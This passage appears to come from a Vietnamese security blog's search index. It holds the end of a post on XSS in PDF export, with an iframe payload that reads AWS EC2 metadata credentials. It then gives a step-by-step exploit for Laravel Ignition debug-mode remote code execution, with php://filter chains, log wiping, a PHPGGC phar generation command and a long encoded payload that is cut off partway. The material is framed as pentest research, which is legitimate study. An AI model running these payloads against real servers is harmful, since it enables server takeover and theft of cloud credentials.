b·∫£n v2 c√≥ URL h∆°i kh√°c so v·ªõi v1, n√™n c√≥ th·ªÉ s·ª≠ d·ª•ng payload n√†y ƒë·ªÉ ƒë·ªçc th√¥ng tin ec2\n1  \u0026lt;iframe src=http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance\u0026gt;\u0026lt;/iframe\u0026gt;   Bingo, v·∫≠y l√† ta c√≥ th·ªÉ n√¢ng impact c·ªßa XSS l√™n cao h∆°n, ch√∫ng ta c√≥ th·ªÉ s·ª≠ d·ª•ng Token, Accesskey, SecretKey c·ªßa AWS ƒë·ªÉ ki·ªÉm tra xem n√≥ c√≥ full quy·ªÅn hay kh√¥ng, m√¨nh s·ª≠ d·ª•ng tool n√†y ƒë·ªÉ ki·ªÉm tra xem v·ªõi Token n√†y m√¨nh c√≥ th·ªÉ th·ª±c hi·ªán h√†nh ƒë·ªông g√¨ tr√™n AWS https://github.com/andresriancho/enumerate-iam\nT·ªïng k·∫øt Vi·ªác t√¨m ra l·ªói l√† m·ªôt chuy·ªán, c√≤n vi·ªác n√¢ng impact, k·∫øt h·ª£p c√°c l·ªói kh√°c t·∫°o th√†nh l·ªói l·ªõn h∆°n, ƒë·∫∑c bi·ªát trong nh·ªØng s√†n bugbounty, nh·ªØng l·ªói cao c√≥ th·ªÉ ƒë∆∞·ª£c tr·∫£ ti·ªÅn g·∫•p ƒë√¥i l·ªói th·∫•p h∆°n. Hi v·ªçng b√†i vi·∫øt n√†y c√≥ √≠ch v·ªõi c√°c b·∫°n, let\u0026rsquo;s go.\n","permalink":"https://minhtuanact.ml/posts/pdf-export-can-than-voi-nhung-input-co-the-truyen-vao/","summary":"Gi·ªõi thi·ªáu D·∫°o g·∫ßn ƒë√¢y m√¨nh t√¨nh c·ªù g·∫∑p r·∫•t nhi·ªÅu l·ªói XSS, tuy nhi√™n trang ƒë√≥ l·∫°i c√≥ s·ª≠ d·ª•ng d·ªØ li·ªáu ng∆∞·ªùi d√πng input v√†o ƒë·ªÉ export ra PDF. V·∫≠y l√†m sao ƒë·ªÉ c√≥ th·ªÉ n√¢ng impact l√™n m·ª©c cao h∆°n, m√¨nh c≈©ng ƒë√£ g·∫∑p nhi·ªÅu case d·ªÖ d√†ng c√≥, kh√≥ khƒÉn c≈©ng c√≥, hi v·ªçng b√†i bi·∫øt n√†y c·ªßa m√¨nh s·∫Ω gi√∫p b·∫°n ƒë·ªçc hi·ªÉu r√µ v·∫•n ƒë·ªÅ khi code ho·∫∑c pentest 1 t√≠nh nƒÉng export PDF.","title":"PDF Export, c·∫©n th·∫≠n v·ªõi nh·ªØng input c√≥ th·ªÉ truy·ªÅn v√†o"},{"content":"T·∫£n m·∫°n \u0026ldquo;H·∫±ng nƒÉm c·ª© v√†o cu·ªëi ƒë√¥ng, l√° ngo√†i ƒë∆∞·ªùng r·ª•ng nhi·ªÅu v√† tr√™n kh√¥ng c√≥ nh·ªØng ƒë√°m m√¢y b√†ng b·∫°c, l√≤ng t√¥i l·∫°i nao n·ª©c nh·ªØng k·ª∑ ni·ªám hoang mang.\nT√¥i kh√¥ng th·ªÉ n√†o qu√™n ƒë∆∞·ª£c nh·ªØng c·∫£m gi√°c trong s√°ng ·∫•y n·∫£y n·ªü trong l√≤ng t√¥i nh∆∞ m·∫•y c√†nh hoa t∆∞∆°i m·ªâm c∆∞·ªùi gi·ªØa b·∫ßu tr·ªùi quang ƒë√£ng.\nNh·ªØng √Ω t∆∞·ªüng ·∫•y t√¥i ch∆∞a l·∫ßn n√†o ghi l√™n gi·∫•y, v√¨ h·ªìi ·∫•y t√¥i kh√¥ng bi·∫øt ghi v√† ng√†y nay t√¥i kh√¥ng nh·ªõ h·∫øt. Nh∆∞ng m·ªói l·∫ßn th·∫•y c√°c b·∫°n vi·∫øt nh·ªØng nghi√™n c·ª©u c·ªßa b·∫£n th√¢n m√¨nh ƒë·ªÉ chia s·∫ª cho m·ªçi ng∆∞·ªùi, l√≤ng t√¥i l·∫°i t∆∞ng b·ª´ng r·ªôn r√£.\nBu·ªïi s√°ng mai h√¥m ·∫•y, m·ªôt bu·ªïi mai ƒë·∫ßy s∆∞∆°ng thu v√† gi√≥ l·∫°nh. T√¥i √¢u y·∫øm ng·ªìi l√™n chi·∫øc Sirius quen thu·ªôc r·ªìi ƒëi tr√™n nh·ªØng con ph·ªë H√† N·ªôi ƒë·∫ßy t·∫•p n·∫≠p. Con ƒë∆∞·ªùng n√†y t√¥i ƒë√£ quen ƒëi l·∫°i l·∫Øm l·∫ßn, nh∆∞ng l·∫ßn n√†y t·ª± nhi√™n t√¥i th·∫•y l·∫°. C·∫£nh v·∫≠t chung quanh t√¥i ƒë·ªÅu thay ƒë·ªïi, v√¨ ch√≠nh l√≤ng t√¥i ƒëang c√≥ s·ª± thay ƒë·ªïi l·ªõn: H√¥m nay t√¥i ƒëi l√†m\u0026rdquo;\nGi·ªØa c√°i th·ªùi ti·∫øt r√©t bu·ªët ƒë·∫øn ƒë·ªô m·ªói s√°ng ng∆∞·ªùi ta s·∫Ω ƒë√°nh v·∫≠t v·ªõi l√Ω tr√≠ c·ªßa b·∫£n th√¢n: d·∫≠y chu·∫©n b·ªã ƒëi l√†m hay xin Inlate 2 ti·∫øng ƒë·ªÉ ƒëi ng·ªß th√™m. C√≤n t√¥i th√¨ v·∫´n nh∆∞ m·ªôt th√≥i quen, 6h s√°ng chi·∫øc Google Home Mini ƒë√°nh th·ª©c t√¥i d·∫≠y b·∫±ng b·∫£n nh·∫°c \u0026ldquo;Gi√° nh∆∞\u0026rdquo; c·ªßa Chillies, m·ªôt b√†i m√† t√¥i r·∫•t th√≠ch trong th·ªùi gian g·∫ßn ƒë√¢y. Tr∆∞·ªõc khi r·ªùi kh·ªèi chi·∫øc chƒÉn ·∫•m c·ªßa m√¨nh, ƒë·∫ßu ti√™n t√¥i s·∫Ω t√¨m c√°i ƒëi·ªán tho·∫°i c·ªßa m√¨nh v√† xem ng√†y h√¥m nay th·∫ø gi·ªõi ƒë√£ thay ƒë·ªïi ƒë∆∞·ª£c nh·ªØng g√¨, l∆∞·ªõt 1 d·∫°o th·∫•y m·ªôt b√†i Writeup v·ª´a m·ªõi ƒë∆∞·ª£c public kh√¥ng l√¢u ·ªü Laravel \u0026lt;= v8.4.2 debug mode: Remote code execution. T√¥i d·∫ßn d·∫ßn ch√∫ √Ω v√†o ti√™u ƒë·ªÅ c·ªßa b√†i vi·∫øt v√† ƒë·ªçc m·ªôt ch√∫t n·ªôi dung trong n√†y. Ch√†! m·ªôt b√†i vi·∫øt th·∫≠t c√¥ng phu, s√°ng nay t√¥i l·∫°i c√≥ th·ª© m·ªõi ƒë·ªÉ nghi√™n c·ª©u r·ªìi. V·∫≠y l√† t√¥i chu·∫©n b·ªã l√™n ƒë∆∞·ªùng ƒëi l√†m v·ªõi m·ªôt c·∫£m x√∫c th·∫≠t t∆∞∆°i vui. H√¥m nay t√¥i ƒëi l√†m.\n T·∫£n m·∫°n v·∫≠y ƒë·ªß r·ªìi, b√†i vi·∫øt n√†y l√† b√†i vi·∫øt v·ªÅ k·ªπ thu·∫≠t ch·ª© kh√¥ng ph·∫£i b√†i vƒÉn xu√¥i ƒë√¢u :D\n  T·∫•t c·∫£ n·ªôi dung trong b√†i vi·∫øt n√†y ƒë∆∞·ª£c tham kh·∫£o trong b√†i vi·∫øt https://www.ambionics.io/blog/laravel-debug-rce\n Laravel \u0026lt;= v8.4.2 debug mode: Remote code execution L√†m c√°i video cho n√≥ t√≠n c√°i ƒë√£ {@embed: https://vimeo.com/500275499}\nTrong qu√° tr√¨nh ƒëi test c√°c d·ª± √°n c·ªßa kh√°ch h√†ng, m√¨nh th∆∞·ªùng xuy√™n th·∫•y c√°i mode debug n√†y ƒë∆∞·ª£c b·∫≠t, ng√†y x∆∞a c√≤n l·∫•y ƒë∆∞·ª£c c·∫£ APP_KEYS r·ªìi RCE lu√¥n server test, ƒë∆∞·ª£c ngay c√°i b√°o c√°o x·ªãn, tuy nhi√™n ƒë·∫•y l√† c√¢u chuy·ªán c·ªßa Laravel 5 tr·ªü xu·ªëng th√¥i, c√≤n b√¢y gi·ªù t·ª´ Laravel 6 tr·ªü l√™n th√¨ n√≥ s·ª≠ d·ª•ng Ignition ƒë·ªÉ hi·ªÉn th·ªã debug. Ignition ƒë∆∞·ª£c b·∫≠t t·ª± ƒë·ªông trong Laravel 6 tr·ªü l√™n.\nIgnition \u0026lt;= 2.5.1 ·ªû ƒë√¢y m√¨nh c√≥ 1 file hello.blade.php c√≥ n·ªôi dung l√† {{ $username }}, n·∫øu s·ª≠ d·ª•ng m·ªôt bi·∫øn m√† kh√¥ng ƒë∆∞·ª£c define th√¨ n√≥ s·∫Ω tr·∫£ v·ªÅ m·ªôt l·ªói nh∆∞ h√¨nh b√™n tr√™n. Khi ta click v√†o Make variable Optional th√¨ n√≥ s·∫Ω t·ª± ƒë·ªông replace {{ $username }} th√†nh {{ $username ? '' }}. Ki·ªÉm tra log th√¨ ta th·∫•y ƒë∆∞·ª£c request nh∆∞ sau:\nNh·ªØng researcher ·ªü Ambionics ƒë√£ nghƒ© ƒë·∫øn c√°c s·ª≠ d·ª•ng ch√≠nh t√≠nh nƒÉng n√†y ƒë·ªÉ c√≥ th·ªÉ thay ƒë·ªïi n·ªôi dung c·ªßa file b·∫•t k·ª≥\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47  class MakeViewVariableOptionalSolution implements RunnableSolution { ... public function run(array $parameters = []) { $output = $this-\u0026gt;makeOptional($parameters); if ($output !== false) { file_put_contents($parameters[\u0026#39;viewFile\u0026#39;], $output); } } public function makeOptional(array $parameters = []) { $originalContents = file_get_contents($parameters[\u0026#39;viewFile\u0026#39;]); // [1] $newContents = str_replace(\u0026#39;$\u0026#39;.$parameters[\u0026#39;variableName\u0026#39;], \u0026#39;$\u0026#39;.$parameters[\u0026#39;variableName\u0026#39;].\u0026#34; ?? \u0026#39;\u0026#39;\u0026#34;, $originalContents); $originalTokens = token_get_all(Blade::compileString($originalContents)); // [2] $newTokens = token_get_all(Blade::compileString($newContents)); $expectedTokens = $this-\u0026gt;generateExpectedTokens($originalTokens, $parameters[\u0026#39;variableName\u0026#39;]); if ($expectedTokens !== $newTokens) { // [3] return false; } return $newContents; } protected function generateExpectedTokens(array $originalTokens, string $variableName): array { $expectedTokens = []; foreach ($originalTokens as $token) { $expectedTokens[] = $token; if ($token[0] === T_VARIABLE \u0026amp;\u0026amp; $token[1] === \u0026#39;$\u0026#39;.$variableName) { $expectedTokens[] = [T_WHITESPACE, \u0026#39; \u0026#39;, $token[2]]; $expectedTokens[] = [T_COALESCE, \u0026#39;??\u0026#39;, $token[2]]; $expectedTokens[] = [T_WHITESPACE, \u0026#39; \u0026#39;, $token[2]]; $expectedTokens[] = [T_CONSTANT_ENCAPSED_STRING, \u0026#34;\u0026#39;\u0026#39;\u0026#34;, $token[2]]; } } return $expectedTokens; } ... }   Sau khi ƒë·ªçc ƒë∆∞·ª£c file path truy·ªÅn v√†o [1] v√† thay th·∫ø $variableName th√†nh variableName ?? \u0026quot; c·∫£ file ban ƒë·∫ßu v√† file m·ªõi ƒë·ªÅu s·∫Ω ƒë∆∞·ª£c m√£ h√≥a [2] v√† file ban ƒë·∫ßu ƒë∆∞·ª£c thay th·∫ø b·∫±ng n·ªôi dung m·ªõi c·ªßa n√≥. N·∫øu kh√¥ng, makeOptional s·∫Ω tr·∫£ v·ªÅ false [3] v√† file m·ªõi s·∫Ω kh√¥ng ƒë∆∞·ª£c ghi. Do ƒë√≥, kh√¥ng th·ªÉ l√†m ƒë∆∞·ª£c g√¨ nhi·ªÅu khi s·ª≠ d·ª•ng variableName.\nInput variable duy nh·∫•t c√≤n l·∫°i l√† viewFile, t·ª´ ƒëo·∫°n code tr√™n c√≥ th·ªÉ vi·∫øt l·∫°i ƒëo·∫°n code r√∫t g·ªçn nh∆∞ sau:\n1 2  $contents = file_get_contents($parameters[\u0026#39;viewFile\u0026#39;]); file_put_contents($parameters[\u0026#39;viewFile\u0026#39;], $contents);   ƒêo·∫°n code n√†y l·∫•y n·ªôi dung l·∫•y t·ª´ viewFile r·ªìi ch√®n tr·ªü l·∫°i viewFile. Ch·∫≥ng ƒë·ªÉ l√†m g√¨ c·∫£ ƒë√∫ng kh√¥ng :upside_down_face:\nLog file to PHAR PHP wrappers: changing a file C√≥ m·ªôt k·ªπ thu·∫≠t ƒë∆∞·ª£c tr√¨nh b√†y b·ªüi Orange Tsai http://blog.orange.tw/2018/10/. N√≥ s·ª≠ d·ª•ng php:filter ƒë·ªÉ thay ƒë·ªïi n·ªôi dung c·ªßa file tr∆∞·ªõc khi ƒë∆∞·ª£c tr·∫£ v·ªÅ. V√† b√¢y gi·ªù c√≥ th·ªÉ s·ª≠ d·ª•ng k·ªπ thu·∫≠t n√†y ƒë·ªÉ chuy·ªÉn n·ªôi dung c·ªßa file b·∫±ng c√°ch s·ª≠ d·ª•ng c√°ch sau:\n1 2 3  $ echo test | base64 | base64 \u0026gt; /path/to/file.txt $ cat /path/to/file.txt ZEdWemRBbz0K   1 2 3 4 5  $f = \u0026#39;php://filter/convert.base64-decode/resource=/path/to/file.txt\u0026#39;; # Reads /path/to/file.txt, base64-decodes it, returns the result $contents = file_get_contents($f); # Base64-decodes $contents, then writes the result to /path/to/file.txt file_put_contents($f, $contents);   1 2  $ cat /path/to/file.txt test   V·∫≠y c√≥ th·ªÉ s·ª≠a ƒë·ªïi n·ªôi dung file theo c√°ch n√†y, tuy nhi√™n ch√∫ng ta c·∫ßn ph·∫£i s·ª≠a ƒë·ªïi n·ªôi dung file ch·ªâ ƒë∆∞·ª£c v·ªõi 1 d√≤ng duy nh·∫•t\n1 2 3 4  # To base64-decode once, use: $f = \u0026#39;php://filter/read=convert.base64-decode/resource=/path/to/file.txt\u0026#39;; # OR $f = \u0026#39;php://filter/write=convert.base64-decode/resource=/path/to/file.txt\u0026#39;;   Th·∫≠m ch√≠ file ch·ª©a nh·ªØng charset kh√¥ng n·∫±m trong base64 (badchars) th√¨ PHP b·ªè qua nh·ªØng badchars n√†y v√† v·∫´n decode nh∆∞ b√¨nh th∆∞·ªùng\n1  $ echo \u0026#39;:;.!!!!!ZEdWemRBbz0K:;.!!!!!\u0026#39; \u0026gt; /path/to/file.txt   1 2 3  $f = \u0026#39;php://filter/read=convert.base64-decode|convert.base64-decode/resource=/path/to/file.txt\u0026#39;; $contents = file_get_contents($f); file_put_contents($f, $contents);   1 2  $ cat /path/to/file.txt test   V·∫≠y gi·ªù ch√∫ng ta c·∫ßn ph·∫£i t√¨m ƒë∆∞·ª£c 1 file m√† m√¨nh c√≥ th·ªÉ control ƒë∆∞·ª£c th√¥ng tin ghi v√†o file, ·ªü ƒë√¢y ch√≠nh l√† file log m·∫∑c ƒë·ªãnh c·ªßa Laravel\nWrite the log file Theo m·∫∑c ƒë·ªãnh, file log c·ªßa Laravel ch·ª©a m·ªçi l·ªói PHP v√† stack trace, ƒë∆∞·ª£c l∆∞u trong storage/log/laravel.log. C·ªë g·∫Øng t·∫°o ra l·ªói ƒë·ªÉ ƒë∆∞·ª£c ghi l·ªói v√†o file log =)).\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15  [2021-01-11 12:39:44] local.ERROR: file_get_contents(SOME_TEXT_OF_OUR_CHOICE): failed to open stream: No such file or directory {\u0026#34;exception\u0026#34;:\u0026#34;[object] (ErrorException(code: 0): file_get_contents(SOME_TEXT_OF_OUR_CHOICE): failed to open stream: No such file or directory at /work/pentest/laravel/laravel/vendor/facade/ignition/src/Solutions/MakeViewVariableOptionalSolution.php:75) [stacktrace] #0 [internal function]: Illuminate\\\\Foundation\\\\Bootstrap\\\\HandleExceptions-\u0026gt;handleError() #1 /work/pentest/laravel/laravel/vendor/facade/ignition/src/Solutions/MakeViewVariableOptionalSolution.php(75): file_get_contents() #2 /work/pentest/laravel/laravel/vendor/facade/ignition/src/Solutions/MakeViewVariableOptionalSolution.php(67): Facade\\\\Ignition\\\\Solutions\\\\MakeViewVariableOptionalSolution-\u0026gt;makeOptional() #3 /work/pentest/laravel/laravel/vendor/facade/ignition/src/Http/Controllers/ExecuteSolutionController.php(19): Facade\\\\Ignition\\\\Solutions\\\\MakeViewVariableOptionalSolution-\u0026gt;run() #4 /work/pentest/laravel/laravel/vendor/laravel/framework/src/Illuminate/Routing/ControllerDispatcher.php(48): Facade\\\\Ignition\\\\Http\\\\Controllers\\\\ExecuteSolutionController-\u0026gt;__invoke() [...] #32 /work/pentest/laravel/laravel/vendor/laravel/framework/src/Illuminate/Pipeline/Pipeline.php(103): Illuminate\\\\Pipeline\\\\Pipeline-\u0026gt;Illuminate\\\\Pipeline\\\\{closure}() #33 /work/pentest/laravel/laravel/vendor/laravel/framework/src/Illuminate/Foundation/Http/Kernel.php(141): Illuminate\\\\Pipeline\\\\Pipeline-\u0026gt;then() #34 /work/pentest/laravel/laravel/vendor/laravel/framework/src/Illuminate/Foundation/Http/Kernel.php(110): Illuminate\\\\Foundation\\\\Http\\\\Kernel-\u0026gt;sendRequestThroughRouter() #35 /work/pentest/laravel/laravel/public/index.php(52): Illuminate\\\\Foundation\\\\Http\\\\Kernel-\u0026gt;handle() #36 /work/pentest/laravel/laravel/server.php(21): require_once(\u0026#39;/work/pentest/l...\u0026#39;) #37 {main} \u0026#34;}   V·∫≠y l√† ch√∫ng ta c√≥ th·ªÉ c√≥ th·ªÉ ƒë∆∞a n·ªôi dung t√πy √Ω v√†o m·ªôt file. Sau ƒë√≥ chuy·ªÉn ƒë·ªïi file log th√†nh file PHAR v√† s·ª≠ d·ª•ng phar ƒë·ªÉ RCE :smiley:\nTuy r·∫±ng nghe c√≥ v·∫ª d·ªÖ nh∆∞ v·∫≠y nh∆∞ng th·∫≠t ra c√≥ r·∫•t nhi·ªÅu v·∫•n ƒë·ªÅ\nConvert file Nh∆∞ ·ªü tr√™n, ta bi·∫øt r·∫±ng PHP s·∫Ω b·ªè qua b·∫•t k·ª≥ badchar n√†o khi s·ª≠ d·ª•ng base64-decoding. ƒêi·ªÅu n√†y ƒë√∫ng, ngo·∫°i tr·ª´ m·ªôt character: =. N·∫øu b·∫°n s·ª≠ d·ª•ng base64-decode filter m·ªôt chu·ªói c√≥ ch·ª©a = ·ªü gi·ªØa, PHP s·∫Ω t·∫°o ra l·ªói v√† kh√¥ng tr·∫£ v·ªÅ k·∫øt qu·∫£ n√†o.\nCh√∫ng ta c√≥ th·ªÉ kh·∫Øc ph·ª•c ƒë∆∞·ª£c ƒëi·ªÅu n√†y n·∫øu ch√∫ng ta c√≥ th·ªÉ control ƒë∆∞·ª£c n·ªôi dung file ƒë√≥. Tuy nhi√™n, payload ch√∫ng ta ƒë∆∞a v√†o file log ch·ªâ l√† m·ªôt ph·∫ßn r·∫•t nh·ªè c·ªßa n√≥. ·ªû m·ªói ƒëo·∫°n log s·∫Ω c√≥ 1 ƒëo·∫°n prefix (timestamp) -\u0026gt; Payload -\u0026gt; suffix (stack strace). H∆°n n·ªØa, payload l·∫°i xu·∫•t hi·ªán2 l·∫ßn trong file log nh∆∞ v√≠ d·ª• d∆∞·ªõi ƒë√¢y:\n1 2 3 4  [2021-01-13 11:09:46] local.ERROR: file_get_contents(PAYLOAD): failed to open stream: No such file or directory {\u0026#34;exception\u0026#34;:\u0026#34; [object] (ErrorException(code: 0): file_get_contents(PAYLOAD): failed to open stream: No such file or directory at /var/www/html/vendor/facade/ignition/src/Solutions/MakeViewVariableOptionalSolution.php:75) [stacktrace] #0 [internal function]: Illuminate\\\\Foundation\\\\Bootstrap\\\\HandleExceptions-\u0026gt;handleError(2, \u0026#39;file_get_conten...\u0026#39;, \u0026#39;/var/www/html/v...\u0026#39;, 75, Array)   Sau nhi·ªÅu l·∫ßn th·ª≠ nghi·ªám, nh·ªØng researcher c·ªßa Ambionics ƒë√£ t√¨m ra c√°ch ƒë·ªÉ lo·∫°i b·ªè c√°c ph·∫ßn d∆∞ th·ª´a ƒë·ªÉ l·∫•y ƒë∆∞·ª£c Payload. V√≠ d·ª• v·ªõi tr∆∞·ªùng h·ª£p nh∆∞ sau:\n1  [prefix]PAYLOAD[midfix]PAYLOAD[suffix]   C√°ch m√† h·ªç s·ª≠ d·ª•ng l√† s·ª≠ d·ª•ng chuy·ªÉn ƒë·ªïi b·∫£ng m√£ UTF-16 sang UTF-8. V√¨ c·ª© 2 byte th√¨ s·∫Ω ƒë∆∞·ª£c 1 char theo m√£ UTF-16 n√™n convert sang UTF-8 th√¨ P\\0 -\u0026gt; P. C√≤n c√°c c·∫∑p 2 byte ·ªü prefix, midfix, suffix s·∫Ω b·ªã convert th√†nh junk char gi·ªëng nh∆∞ d∆∞·ªõi ƒë√¢y (v√† ph·∫ßn junk n√†y sau ƒë√≥ s·∫Ω b·ªã lo·∫°i b·ªè ·ªü b∆∞·ªõc base64 decoding):\n1  echo -ne \u0026#39;[Some prefix ]P\\0A\\0Y\\0L\\0O\\0A\\0D\\0[midfix]P\\0A\\0Y\\0L\\0O\\0A\\0D\\0[Some suffix ]\u0026#39; \u0026gt; /tmp/test.txt   1 2  php \u0026gt; echo file_get_contents(\u0026#39;php://filter/read=convert.iconv.utf16le.utf-8/resource=/tmp/test.txt\u0026#39;); ÂçõÊµØ‚Å•Áâ∞Êô•Á°©Â¥†PAYLOADÊµõÊë©Ê•¶Âµ∏PAYLOADÂçõÊµØ‚Å•Áï≥Êô¶Á°©Â¥†   Ok, gi·ªù ta ƒë√£ gi·ªØ ƒë∆∞·ª£c n·ªôi dung c·ªßa payload, b∆∞·ªõc ti·∫øp theo l√† lo·∫°i b·ªè nh·ªØng k√Ω t·ª± n√†o kh√¥ng ph·∫£i l√† ASCII l√† xong. Tuy nhi√™n c√≥ m·ªôt v·∫•n ƒë·ªÅ l√† n·ªôi dung Payload l·∫°i hi·ªÉn th·ªã 2 l·∫ßn, ch√∫ng ta c·∫ßn ph·∫£i lo·∫°i b·ªè 1 c√°i ƒëi m·ªõi ƒë√∫ng c·∫•u tr√∫c c·ªßa file PHAR. ƒê·ªÉ gi·∫£i quy·∫øt v·∫•n ƒë·ªÅ n√†y ta l·∫°i nh·ªõ l·∫°i l√† UTF-16 l√†m vi·ªác v·ªõi hai byte, n√™n ch·ªâ c·∫ßn th√™m 1 byte v√†o ph·∫ßn gi·ªØa Payload 1 v√† Payload 2 (nh∆∞ d∆∞·ªõi ƒë√¢y l√† th√™m X v√†o sau D\\0) th√¨ byte aligment c·ªßa Payload th·ª© 2 s·∫Ω b·ªã l·ªách, d·∫´n ƒë·∫øn Payload 2 b·ªã convert th√†nh junk chars:\n1  echo -ne \u0026#39;[Some prefix ]P\\0A\\0Y\\0L\\0O\\0A\\0D\\0X[midfix]P\\0A\\0Y\\0L\\0O\\0A\\0D\\0X[Some suffix ]\u0026#39; \u0026gt; /tmp/test.txt   1 2  php \u0026gt; echo file_get_contents(\u0026#39;php://filter/read=convert.iconv.utf16le.utf-8/resource=/tmp/test.txt\u0026#39;); ÂçõÊµØ‚Å•Áâ∞Êô•Á°©Â¥†PAYLOADÂ≠òÊ•≠Êô§Á°©ÂÅù‰ÑÄÂ§Ä‰∞Ä‰ºÄ‰ÑÄ‰êÄÂ†ÄÂçõÊµØ‚Å•Áï≥Êô¶Á°©Â¥†   V·∫≠y, k·∫øt lu·∫≠n ch√∫ng ta s·∫Ω c√≥ get chain cu·ªëi c√πng l√†:\n1  viewFile: php://filter/write=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource=/path/to/storage/logs/laravel.log   Complete exploit steps B∆∞·ªõc 1: T·∫°o PHPGGC payload v√† encode n√≥ theo format tr√™n: 1  php -d\u0026#39;phar.readonly=0\u0026#39; ./phpggc monolog/rce1 system id --phar phar -o php://output | base64 -w0 | sed -E \u0026#39;s/./\\0=00/g\u0026#39;   Ch√∫ √Ω, ch·ªânh s·ª≠a m·ªôt ch√∫t ·ªü ph√≠a ƒë·∫ßu ra Payload, thay th·∫ø d·∫•u == th√†nh =3D. M√¨nh c≈©ng k hi·ªÉu v√¨ sao Ambionics ch·∫°y ƒë∆∞·ª£c v·ªõi 2 d·∫•u = ·ªü cu·ªëi payload, m√¨nh ch·∫°y to√†n b·ªã l·ªói\n1  Warning: file_get_contents(): stream filter (convert.quoted-printable-decode): invalid byte sequence in php shell code on line 1   Sau m·ªôt h·ªìi anh em debug th√¨ ph√°t hi·ªán ra ph·∫£i s·ª≠a 1 d·∫•u = th√†nh 3D th√¨ ch·∫°y ngon ngh·∫ª, n·∫øu th·∫•y xu·∫•t hi·ªán l·ªói\n1  Warning: file_get_contents(): iconv stream filter (\u0026#34;utf-16le\u0026#34;=\u0026gt;\u0026#34;utf-8\u0026#34;): invalid multibyte sequence in php shell code on line 1   th√¨ ph·∫£i ƒë·ªám th√™m 1 byte =00 v√†o ƒë·ªÉ decode ƒë∆∞·ª£c nh√©.\nB∆∞·ªõc 2: Xo√° log 1  viewFile: php://filter/write=convert.base64-decode|convert.base64-decode|convert.base64-decode/resource=/path/to/storage/logs/laravel.log    Ch·∫≥ng hi·ªÉu ki·ªÉu g√¨ b·∫°n v·ªõi s·∫øp m√¨nh d√πng c√°ch n√†y xo√° ƒë∆∞·ª£c log m√† m√¨nh ph·∫£i d√πng c√°ch kh√°c ƒë·ªÉ xo√° log \u0026gt;.\u0026lt;\n B∆∞·ªõc 3: T·∫°o log ch·ª©a payload 1  viewFile: P=00D=009=00w=00a=00H=00A=00g=00X=001=009=00I=00Q=00U=00x=00U=00X=000=00N=00P=00T=00V=00B=00J=00T=00E=00V=00S=00K=00C=00k=007=00I=00D=008=00+=00D=00Q=00r=00F=00A=00g=00A=00A=00A=00g=00A=00A=00A=00B=00E=00A=00A=00A=00A=00B=00A=00A=00A=00A=00A=00A=00B=00u=00A=00g=00A=00A=00T=00z=00o=00z=00M=00j=00o=00i=00T=00W=009=00u=00b=002=00x=00v=00Z=001=00x=00I=00Y=00W=005=00k=00b=00G=00V=00y=00X=00F=00N=005=00c=002=00x=00v=00Z=001=00V=00k=00c=00E=00h=00h=00b=00m=00R=00s=00Z=00X=00I=00i=00O=00j=00E=006=00e=003=00M=006=00O=00T=00o=00i=00A=00C=00o=00A=00c=002=009=00j=00a=002=00V=000=00I=00j=00t=00P=00O=00j=00I=005=00O=00i=00J=00N=00b=002=005=00v=00b=00G=009=00n=00X=00E=00h=00h=00b=00m=00R=00s=00Z=00X=00J=00c=00Q=00n=00V=00m=00Z=00m=00V=00y=00S=00G=00F=00u=00Z=00G=00x=00l=00c=00i=00I=006=00N=00z=00p=007=00c=00z=00o=00x=00M=00D=00o=00i=00A=00C=00o=00A=00a=00G=00F=00u=00Z=00G=00x=00l=00c=00i=00I=007=00T=00z=00o=00y=00O=00T=00o=00i=00T=00W=009=00u=00b=002=00x=00v=00Z=001=00x=00I=00Y=00W=005=00k=00b=00G=00V=00y=00X=00E=00J=001=00Z=00m=00Z=00l=00c=00k=00h=00h=00b=00m=00R=00s=00Z=00X=00I=00i=00O=00j=00c=006=00e=003=00M=006=00M=00T=00A=006=00I=00g=00A=00q=00A=00G=00h=00h=00b=00m=00R=00s=00Z=00X=00I=00i=00O=000=004=007=00c=00z=00o=00x=00M=00z=00o=00i=00A=00C=00o=00A=00Y=00n=00V=00m=00Z=00m=00V=00y=00U=002=00l=006=00Z=00S=00I=007=00a=00T=00o=00t=00M=00T=00t=00z=00O=00j=00k=006=00I=00g=00A=00q=00A=00G=00J=001=00Z=00m=00Z=00l=00c=00i=00I=007=00Y=00T=00o=00x=00O=00n=00t=00p=00O=00j=00A=007=00Y=00T=00o=00y=00O=00n=00t=00p=00O=00j=00A=007=00c=00z=00o=002=00O=00i=00J=00s=00c=00y=00A=00t=00b=00G=00E=00i=00O=003=00M=006=00N=00T=00o=00i=00b=00G=00V=002=00Z=00W=00w=00i=00O=000=004=007=00f=00X=001=00z=00O=00j=00g=006=00I=00g=00A=00q=00A=00G=00x=00l=00d=00m=00V=00s=00I=00j=00t=00O=00O=003=00M=006=00M=00T=00Q=006=00I=00g=00A=00q=00A=00G=00l=00u=00a=00X=00R=00p=00Y=00W=00x=00p=00e=00m=00V=00k=00I=00j=00t=00i=00O=00j=00E=007=00c=00z=00o=00x=00N=00D=00o=00i=00A=00C=00o=00A=00Y=00n=00V=00m=00Z=00m=00V=00y=00T=00G=00l=00t=00a=00X=00Q=00i=00O=002=00k=006=00L=00T=00E=007=00c=00z=00o=00x=00M=00z=00o=00i=00A=00C=00o=00A=00c=00H=00J=00v=00Y=002=00V=00z=00c=002=009=00y=00c=00y=00I=007=00Y=00T=00o=00y=00O=00n=00t=00p=00O=00j=00A=007=00c=00z=00o=003=00O=00i=00J=00j=00d=00X=00J=00y=00Z=00W=005=000=00I=00j=00t=00p=00O=00j=00E=007=00c=00z=00o=002=00O=00i=00J=00z=00e=00X=00N=000=00Z=00W=000=00i=00O=003=001=009=00c=00z=00o=00x=00M=00z=00o=00i=00A=00C=00o=00A=00Y=00n=00V=00m=00Z=00m=00V=00y=00U=002=00l=006=00Z=00S=00I=007=00a=00T=00o=00t=00M=00T=00t=00z=00O=00j=00k=006=00I=00g=00A=00q=00A=00G=00J=001=00Z=00m=00Z=00l=00c=00i=00I=007=00Y=00T=00o=00x=00O=00n=00t=00p=00O=00j=00A=007=00Y=00T=00o=00y=00O=00n=00t=00p=00O=00j=00A=007=00c=00z=00o=002=00O=00i=00J=00s=00c=00y=00A=00t=00b=00G=00E=00i=00O=003=00M=006=00N=00T=00o=00i=00b=00G=00V=002=00Z=00W=0